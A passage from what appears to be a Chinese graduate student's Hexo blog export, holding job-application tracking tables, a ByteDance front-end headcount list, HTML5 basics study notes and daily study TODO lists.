<tr><td>诺瓦科技</td><td>北京</td><td></td><td></td><td>1</td><td></td><td>0</td><td></td><td></td><td>官网，牛客</td></tr><tr><td>中联集团</td><td>北京</td><td></td><td></td><td>1</td><td></td><td></td><td>g</td><td></td><td>牛客</td></tr><tr><td>兴业数金</td><td>成都</td><td></td><td></td><td></td><td></td><td>done</td><td>g</td><td></td><td>牛客</td></tr><tr><td>米哈游</td><td>上海</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>官网</td></tr><tr><td>视源股份</td><td>广州</td><td></td><td></td><td></td><td></td><td>done</td><td></td><td></td><td><a href="https://careers.cvte.com/zone/resume/applications">https://careers.cvte.com/zone/resume/applications</a></td></tr><tr><td>4399</td><td>广州</td><td></td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td></tr><tr><td>星环科技</td><td>上海</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>顺丰</td><td>广州</td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td></tr><tr><td>bilibili</td><td>上海</td><td></td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td></tr><tr><td>快手</td><td>北京</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>经纬恒润</td><td></td><td></td><td></td><td></td><td></td><td><font color="#FF00FF">done</font></td><td></td><td></td><td></td></tr><tr><td>360</td><td></td><td></td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td></tr><tr><td>恒生</td><td></td><td></td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td></tr><tr><td>CVTE</td><td></td><td></td><td></td><td></td><td></td><td>9.14</td><td></td><td></td><td></td></tr><tr><td>奇安信</td><td></td><td></td><td></td><td></td><td></td><td>9.15</td><td></td><td></td><td></td></tr><tr><td>欧科云链</td><td></td><td></td><td></td><td></td><td></td><td>9.16 2</td><td></td><td></td><td></td></tr><tr><td>字节跳动</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><table><thead><tr><th>岗位</th><th>hc</th><th>base</th><th>类型</th></tr></thead><tbody><tr><td>字节前端-商业化技术</td><td>20</td><td>北京</td><td>研发</td></tr><tr><td>字节前端-搜索</td><td>4</td><td>北京</td><td>研发</td></tr><tr><td>字节前端-番茄</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-幸福里</td><td>4</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-Data</td><td>50</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-TikTok</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-安全与风控</td><td>2</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-IT</td><td>1</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-飞书</td><td>20</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-电商</td><td>20</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-今日头条</td><td>4</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-AI Lab</td><td>2</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-火山引擎</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-字节跳动视频云</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-TikTok直播</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-风控</td><td>1</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-抖音</td><td>10</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-产品研发</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-小荷健康</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-系统架构</td><td>100</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-基础架构</td><td>10</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-智能创作</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-Pico</td><td>10</td><td>北京</td><td>前端</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ol><li>行测 </li></ol><p><img src="http://files.shanqianche.cn/20227/1658733771396.png" alt="科大讯飞"><br>2. 1.对编程语言设计有了解，对抽象语法树（AST）有一定的认知，或者感兴趣者优先<br>2.对网站性能优化有所研究，在实际项目中有经验者优先</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找工作</title>
      <link href="/2022/07/22/%E6%89%BE%E5%B7%A5%E4%BD%9C-DESKTOP-GBOPJPV/"/>
      <url>/2022/07/22/%E6%89%BE%E5%B7%A5%E4%BD%9C-DESKTOP-GBOPJPV/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>company</th><th>base</th><th>类型</th><th>进度</th><th>简历筛选</th><th>评测</th><th>笔试</th><th>面试</th><th></th><th></th></tr></thead><tbody><tr><td>字节跳动–飞书</td><td>北京</td><td>提前</td><td>7.22-</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>OPPO</td><td>深圳</td><td>提前</td><td></td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>联想</td><td></td><td>提前</td><td></td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>蔚来-自动驾驶</td><td>北京</td><td>提前</td><td>7.26</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>搜狐</td><td>北京</td><td>正式</td><td>7.26</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>墨奇科技</td><td>成都</td><td>正式</td><td>7.27</td><td>0</td><td></td><td></td><td></td><td></td><td>牛客上投</td></tr><tr><td>旷视</td><td>北京</td><td>提前</td><td>7.27-</td><td>pending</td><td></td><td></td><td></td><td></td><td><a href="https://www.nowcoder.com/discuss/995610?type=all&order=recall&pos=&page=1&ncTraceId=&channel=-1&source_id=search_all_nctrack&gio_id=616D3348D7B7853881972116C05A455F-1658913333687">内推</a></td></tr><tr><td>用友</td><td>北京</td><td>正式</td><td>7-27</td><td></td><td></td><td></td><td></td><td></td><td>牛客上投</td></tr><tr><td>猿辅导</td><td>北京</td><td></td><td>7-28</td><td>pending</td><td></td><td>done</td><td></td><td></td><td></td></tr><tr><td>森汉科技</td><td>北京</td><td></td><td>7-28</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>网易互娱</td><td>广州</td><td></td><td>7.28-29</td><td>1</td><td></td><td></td><td></td><td></td><td>官网，牛客内推</td></tr><tr><td>网易雷火</td><td>杭州</td><td></td><td>7-28</td><td></td><td></td><td></td><td></td><td></td><td>官网</td></tr><tr><td>北森</td><td>北京</td><td></td><td>7.28-29-31</td><td>1</td><td>done</td><td></td><td></td><td></td><td>牛客</td></tr><tr><td>东方财富</td><td>上海</td><td>提前</td><td>7.29-29-31</td><td>1</td><td>done</td><td></td><td></td><td></td><td>牛客</td></tr><tr><td>旷视</td><td>北京</td><td>正式</td><td>7.30</td><td>pending</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>一点资讯</td><td>北京</td><td>正式</td><td>7.30</td><td>0</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>竞技世界</td><td>北京</td><td>正式</td><td>7.30</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>极智嘉Geek+</td><td>苏州</td><td>正式</td><td>7.30</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>远景</td><td></td><td></td><td>8.1</td><td>1</td><td>done</td><td></td><td></td><td></td><td></td></tr><tr><td>大疆</td><td></td><td></td><td>8.1</td><td>1</td><td>done</td><td>done</td><td></td><td></td><td></td></tr><tr><td>同盾</td><td></td><td></td><td></td><td>pending</td><td></td><td>done</td><td>0</td><td></td><td></td></tr><tr><td>作业帮</td><td>北京</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>上海爱数</td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td><td>牛客</td></tr><tr><td>内蒙古钛驰新迪商务有限公司</td><td></td><td></td><td></td><td>0</td><td></td><td></td><td></td><td></td><td>牛客</td></tr><tr><td>诺瓦科技</td><td>北京</td><td></td><td></td><td>1</td><td></td><td>0</td><td></td><td></td><td>官网，牛客</td></tr><tr><td>中联集团</td><td>北京</td><td></td><td></td><td>1</td><td></td><td></td><td>g</td><td></td><td>牛客</td></tr><tr><td>兴业数金</td><td>成都</td><td></td><td></td><td></td><td></td><td>done</td><td>g</td><td></td><td>牛客</td></tr><tr><td>米哈游</td><td>上海</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>官网</td></tr><tr><td>视源股份</td><td>广州</td><td></td><td></td><td></td><td></td><td>done</td><td></td><td></td><td><a href="https://careers.cvte.com/zone/resume/applications">https://careers.cvte.com/zone/resume/applications</a></td></tr><tr><td>4399</td><td>广州</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>星环科技</td><td>上海</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>顺丰</td><td>广州</td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td></tr><tr><td>bilibili</td><td>上海</td><td></td><td></td><td></td><td></td><td>9.1 19</td><td></td><td></td><td></td></tr><tr><td>快手</td><td>北京</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>经纬恒润</td><td></td><td></td><td></td><td></td><td></td><td><font color="#FF00FF">done</font></td><td></td><td></td><td></td></tr><tr><td>科大讯飞</td><td></td><td></td><td></td><td></td><td></td><td>9.3 19-21</td><td></td><td></td><td></td></tr></tbody></table><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><table><thead><tr><th>岗位</th><th>hc</th><th>base</th><th>类型</th></tr></thead><tbody><tr><td>字节前端-商业化技术</td><td>20</td><td>北京</td><td>研发</td></tr><tr><td>字节前端-搜索</td><td>4</td><td>北京</td><td>研发</td></tr><tr><td>字节前端-番茄</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-幸福里</td><td>4</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-Data</td><td>50</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-TikTok</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-安全与风控</td><td>2</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-IT</td><td>1</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-飞书</td><td>20</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-电商</td><td>20</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-今日头条</td><td>4</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-AI Lab</td><td>2</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-火山引擎</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-字节跳动视频云</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-TikTok直播</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-风控</td><td>1</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-抖音</td><td>10</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-产品研发</td><td>5</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-小荷健康</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-系统架构</td><td>100</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-基础架构</td><td>10</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-智能创作</td><td>3</td><td>北京</td><td>前端</td></tr><tr><td>字节前端-Pico</td><td>10</td><td>北京</td><td>前端</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ol><li>行测 </li></ol><p><img src="http://files.shanqianche.cn/20227/1658733771396.png" alt="科大讯飞"><br>2. 1.对编程语言设计有了解，对抽象语法树（AST）有一定的认知，或者感兴趣者优先<br>2.对网站性能优化有所研究，在实际项目中有经验者优先</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H5基础(第一天)</title>
      <link href="/2022/07/21/H5%E5%9F%BA%E7%A1%80(%E7%AC%AC%E4%B8%80%E5%A4%A9)/"/>
      <url>/2022/07/21/H5%E5%9F%BA%E7%A1%80(%E7%AC%AC%E4%B8%80%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h2 id="html标签的类型（head，-body，-Doctype）-他们的作用是什么"><a href="#html标签的类型（head，-body，-Doctype）-他们的作用是什么" class="headerlink" title="html标签的类型（head， body，!Doctype） 他们的作用是什么"></a>html标签的类型（head， body，!Doctype） 他们的作用是什么</h2><h3 id="！Doctype"><a href="#！Doctype" class="headerlink" title="！Doctype"></a><strong>！Doctype</strong></h3><p>不是html标签，用来文档类型声明（DTD），h5只有一种html。h4有三种Strict、Transitional 和 Frameset。，而且由于是基于 SGML （Standard Generalized Markup Language 标准通用标记语言），所以必须声明才能确保浏览器能够预先知道文档类型。</p><p><img src="http://files.shanqianche.cn/20227/1658364969147.png" alt="区别在于是否包涵过时样式，Frameset则允许使用框架集内容"></p><h3 id="head"><a href="#head" class="headerlink" title="head"></a><strong>head</strong></h3><p>是所有头部元素的容器。必须包含文档的标题（title），可以包含脚本、样式、meta 信息 以及其他更多的信息。<font color="#FF1493">理解此处用于存放页面配置。</font><br> <font color="#FF8C00"><code>&lt;base&gt;</code></font>最多能使用一个 <base> 元素，规定页面上所有链接的默认 URL 和默认目标(页面在何处打开_blank)。<br> <font color="#FF8C00"><code>&lt;style&gt;</code></font> 标签定义 HTML 文档的样式信息。<br> <font color="#FF8C00"><code>&lt;link&gt;</code></font>定义文档与外部资源的关系，最常见的用途是链接样式表。<br> <font color="#FF8C00"><code>&lt;meta&gt;</code></font>提供了 HTML 文档的元数据。元数据不会显示在客户端，但是会被浏览器解析。META元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者及其他元数据。元数据可以被使用浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 Web 服务调用。<br> <font color="#FF8C00"><code>&lt;script&gt;</code></font>用于定义客户端脚本，既可包含脚本语句，也可以通过 “src” 属性指向外部脚本文件。<font color="#ff7500">如果使用 “src” 属性，则 <code>&lt;script&gt;</code> 元素必须是空的。</font><font color="#7FFF00">async ：可选。表示应该立即开始下载脚本，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载。只对外部脚本文件有效。</font><font color="#D2691E">crossorigin ：可选。配置相关请求的CORS（跨源资源共享）设置。</font><font color="#DC143C">默认defer ：可选。表示脚本可以延迟到文档完全被解析和显示之后再执行。</font><font color="#00008B">type ：如果这个值是 module ，则代码会被当成 ES6 模块，而且只有这时候代码中才能出现 import 和 export 关键字。</font><br> <font color="#FF8C00"><code>&lt;noscript&gt;</code></font>noscript 元素用来定义在脚本未被执行时的替代内容（文本）。</p><h3 id="body"><a href="#body" class="headerlink" title="body"></a><strong>body</strong></h3><p> 用于定义文档的主体, 包含了文档的所有内容，支持html的全局属性和事件属性.</p><h2 id="h5新特性"><a href="#h5新特性" class="headerlink" title="h5新特性"></a>h5新特性</h2><ol><li><strong>语义标签</strong><br><font color="#FF8C00">html5语义标签</font>，可以使开发者更方便清晰构建页面的布局</li></ol><p> <img src="http://files.shanqianche.cn/20227/1658366915966.png" alt="语义标签"><br>2. <strong>增强表单</strong><br>  <font color="#FF8C00">增强表单</font>修改一些新的 input 输入特性，改善更好的输入控制和验证</p><p>  <img src="http://files.shanqianche.cn/20227/1658367044633.png" alt="新增了五个表单元素"></p><p>  <img src="http://files.shanqianche.cn/20227/1658367065516.png" alt="新增表单属性"></p><ol start="3"><li>音频和视频<br>html5 提供了<font color="#FF8C00">音频和视频文件的标准</font>，既使用 <audio> 元素。</li></ol><p><img src="http://files.shanqianche.cn/20227/1658367289279.png" alt="音频：audio"></p><p><img src="http://files.shanqianche.cn/20227/1658367328581.png" alt="视频 video"></p><ol start="4"><li>Canvas 绘图</li></ol><p><a href="https://www.runoob.com/w3cnote/html5-canvas-intro.html">Canvas 绘图</a></p><ol start="5"><li>SVG 绘图</li></ol><p><img src="http://files.shanqianche.cn/20227/1658367501112.png" alt="SVG"></p><ol start="6"><li>地理定位</li></ol><p>使用 getCurrentPosition() 方法来获取用户的位置。</p><ol start="7"><li>拖放 API</li></ol><p><img src="http://files.shanqianche.cn/20227/1658367578194.png" alt="拖放"></p><p><img src="http://files.shanqianche.cn/20227/1658367594720.png" alt="API"></p><ol start="8"><li>Web Worker</li></ol><p>Web Worker 可以通过加载一个脚本文件，进而创建一个独立工作的线程，在<font color="#8A2BE2">主线程之外运行</font>。基本原理就是在当前 javascript 的主线程中，使用 Worker 类加载一个 javascript 文件来开辟一个新的线程，<br>起到互不阻塞执行的效果，并且提供主线程和新县城之间数据交换的接口：postMessage、onmessage。</p><p><img src="http://files.shanqianche.cn/20227/1658367805683.png" alt="主进程"></p><p><img src="http://files.shanqianche.cn/20227/1658367767351.png" alt="Web Worker"></p><ol start="9"><li>Web Storage</li></ol><p>WebStorage 是 HTML <font color="#FF8C00">新增的本地存储解决方案</font>之一，但并不是取代 cookie 而指定的标准，cookie 作为 HTTP 协议的一部分用来处理客户端和服务器的通信是不可或缺的，session 正式依赖与实现的客户端状态保持。WebSorage 的意图在于解决本来不应该 cookie 做，却不得不用 cookie 的本地存储。</p><p><font color="#FF8C00">websorage 拥有 5M 的存储容量，而 cookie 却只有 4K，这是完全不能比的。</font></p><ol start="10"><li>WebSocket</li></ol><p>WebSocket 协议为 web 应用程序客户端和服务端之间提供了一种<font color="#FF8C00">全双工通信机制</font>。</p><p><img src="http://files.shanqianche.cn/20227/1658367925881.png" alt="特点"></p><h2 id="h5废除的元素"><a href="#h5废除的元素" class="headerlink" title="h5废除的元素"></a>h5废除的元素</h2><ol><li>纯表现元素，可用css代替，big、center</li><li>对可用性产生负面影响的元素 frame框架</li><li>只有部分浏览器支持的元素， bgsound 元素以及 marquee 元素，只被 IE 支持</li></ol><h2 id="伪类和伪元素"><a href="#伪类和伪元素" class="headerlink" title="伪类和伪元素"></a>伪类和伪元素</h2><h3 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h3><p><font color="#9932CC">用于已有元素处于某种状态时为其添加对应的样式，这个状态是根据用户行为而动态变化的</font>。<br>例如：当用户悬停在指定元素时，可以通过:hover来描述这个元素的状态，虽然它和一般css相似，可以为 已有元素添加样式，但是它只有处于DOM树无法描述的状态下才能为元素添加样式，所以称为伪类。</p><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><p><font color="#FF00FF">用于创建一些不在DOM树中的元素，并为其添加样式。</font><br>例如，我们可以通过:before来在一个元素之前添加一些文本，并为这些文本添加样式，虽然用户可以看见 这些文本，但是它实际上并不在DOM文档中</p><h2 id="html5语义化"><a href="#html5语义化" class="headerlink" title="html5语义化"></a>html5语义化</h2><figure class="highlight plaintext"><figcaption><span><!--：页面主体内容。--></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;hn&gt;         &lt;!--：h1~h6，分级标题，&lt;h1&gt; 与 &lt;title&gt; 协调有利于搜索引擎优化。--&gt;</span><br><span class="line">&lt;ul&gt;         &lt;!--：无序列表。--&gt;</span><br><span class="line">&lt;li&gt;         &lt;!--：有序列表。--&gt;</span><br><span class="line">&lt;header&gt;     &lt;!--：页眉通常包括网站标志、主导航、全站链接以及搜索框。--&gt;</span><br><span class="line">&lt;nav&gt;         &lt;!--：标记导航，仅对文档中重要的链接群使用。--&gt;</span><br><span class="line">&lt;main&gt;         &lt;!--：页面主要内容，一个页面只能使用一次。如果是web应用，则包围其主要功能。--&gt;</span><br><span class="line">&lt;article&gt;    &lt;!--：定义外部的内容，其中的内容独立于文档的其余部分。--&gt;</span><br><span class="line">&lt;section&gt;    &lt;!--：定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。--&gt;</span><br><span class="line">&lt;aside&gt;         &lt;!--：定义其所处内容之外的内容。如侧栏、文章的一组链接、广告、友情链接、相关产品列表等。--&gt;</span><br><span class="line">&lt;footer&gt;     &lt;!--：页脚，只有当父级是body时，才是整个页面的页脚。--&gt;</span><br><span class="line">&lt;small&gt;      &lt;!--：呈现小号字体效果，指定细则，输入免责声明、注解、署名、版权。--&gt;</span><br><span class="line">&lt;strong&gt;     &lt;!--：和 em 标签一样，用于强调文本，但它强调的程度更强一些。--&gt;</span><br><span class="line">&lt;em&gt;         &lt;!--：将其中的文本表示为强调的内容，表现为斜体。--&gt;</span><br><span class="line">&lt;mark&gt;       &lt;!--：使用黄色突出显示部分文本。--&gt;</span><br><span class="line">&lt;figure&gt;     &lt;!--：规定独立的流内容（图像、图表、照片、代码等等）（默认有40px左右margin）。--&gt;</span><br><span class="line">&lt;figcaption&gt;&lt;!--：定义 figure 元素的标题，应该被置于 figure 元素的第一个或最后一个子元素的位置。--&gt;</span><br><span class="line">&lt;cite&gt;       &lt;!--：表示所包含的文本对某个参考文献的引用，比如书籍或者杂志的标题。--&gt;</span><br><span class="line">&lt;blockquoto&gt;&lt;!--：定义块引用，块引用拥有它们自己的空间。--&gt;</span><br><span class="line">&lt;q&gt;          &lt;!--：短的引述（跨浏览器问题，尽量避免使用）。--&gt;</span><br><span class="line">&lt;time&gt;       &lt;!--：datetime属性遵循特定格式，如果忽略此属性，文本内容必须是合法的日期或者时间格式。--&gt;</span><br><span class="line">&lt;abbr&gt;       &lt;!--：简称或缩写。--&gt;</span><br><span class="line">&lt;dfn&gt;       &lt;!--：定义术语元素，与定义必须紧挨着，可以在描述列表dl元素中使用。--&gt;</span><br><span class="line">&lt;address&gt;    &lt;!--：作者、相关人士或组织的联系信息（电子邮件地址、指向联系信息页的链接）。--&gt;</span><br><span class="line">&lt;del&gt;        &lt;!--：移除的内容。--&gt;</span><br><span class="line">&lt;ins&gt;        &lt;!--：添加的内容。--&gt;</span><br><span class="line">&lt;code&gt;       &lt;!--：标记代码。--&gt;</span><br><span class="line">&lt;meter&gt;      &lt;!--：定义已知范围或分数值内的标量测量。（Internet Explorer 不支持 meter 标签）--&gt;</span><br><span class="line">&lt;progress&gt;    &lt;!--：定义运行中的进度（进程）。--&gt;</span><br></pre></td></tr></table></figure><p><strong>语义化优点：</strong></p><ul><li>易于用户阅读，样式丢失的时候能让页面呈现清晰的结构。</li><li>有利于SEO，搜索引擎根据标签来确定上下文和各个关键字的权重。</li><li>方便屏幕阅读器解析，如盲人阅读器根据语义渲染网页</li><li>有利于开发和维护，语义化更具可读性，代码更好维护，与CSS3关系更和谐。</li></ul><h2 id="audio-标签的api"><a href="#audio-标签的api" class="headerlink" title="audio 标签的api"></a>audio 标签的api</h2><p><img src="http://files.shanqianche.cn/20227/1658369057402.png" alt="audio常用属性"></p><p><img src="http://files.shanqianche.cn/20227/1658369068589.png" alt="audio音乐格式的支持"></p><p><img src="http://files.shanqianche.cn/20227/1658369081886.png" alt="audio属性"></p><p><img src="http://files.shanqianche.cn/20227/1658369102710.png" alt="常用的控制用的函数："></p><p><img src="http://files.shanqianche.cn/20227/1658369117654.png" alt="常用audio的事件"></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> daily/weekly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-14研究生的倒数第307天</title>
      <link href="/2022/07/14/2022-7-14%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC307%E5%A4%A9/"/>
      <url>/2022/07/14/2022-7-14%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC307%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:20 今日学习学习            <strong><font color="#D2691E">JS完成第八章</font></strong></li><li><input disabled="" type="checkbox"> 10:20~11:20 今日学习学习            <strong><font color="#D2691E">算法</font></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-13研究生最后的七月</title>
      <link href="/2022/07/13/2022-7-13%E7%A0%94%E7%A9%B6%E7%94%9F%E6%9C%80%E5%90%8E%E7%9A%84%E4%B8%83%E6%9C%88/"/>
      <url>/2022/07/13/2022-7-13%E7%A0%94%E7%A9%B6%E7%94%9F%E6%9C%80%E5%90%8E%E7%9A%84%E4%B8%83%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 7.13-7.17完成JS，算法视频课程，设计模式</li><li><input disabled="" type="checkbox"> 7.18-7.20完成计组计网操作系统</li><li><input disabled="" type="checkbox"> 7.21-7.21完成html，css基本</li><li><input disabled="" type="checkbox"> 7.22-7.24完成vue[八股文]</li><li><input disabled="" type="checkbox"> 7.25-7.31webpack，node，流程测试，，，，八股文，项目，简历</li></ul><h1 id="DONE-Daily"><a href="#DONE-Daily" class="headerlink" title="DONE Daily"></a>DONE Daily</h1><p>全军牺牲</p><p>26：<br>链表的反转理解 </p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-13研究生的倒数第308天</title>
      <link href="/2022/07/13/2022-7-13%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC308%E5%A4%A9/"/>
      <url>/2022/07/13/2022-7-13%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC308%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">JS完成第八章</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:50 今日学习学习            <strong><font color="#D2691E">算法</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 <strong><font color="#D2691E">实现算法</font></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-12研究生的倒数第309天</title>
      <link href="/2022/07/12/2022-7-12%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC309%E5%A4%A9/"/>
      <url>/2022/07/12/2022-7-12%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC309%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">JS完成第八章</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:50 今日学习学习            <strong><font color="#D2691E">算法</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 <strong><font color="#D2691E">实现算法</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 中午总结and下午安排 <strong><font color="#D2691E">算法</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">JS</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">小论文</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">小论文</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 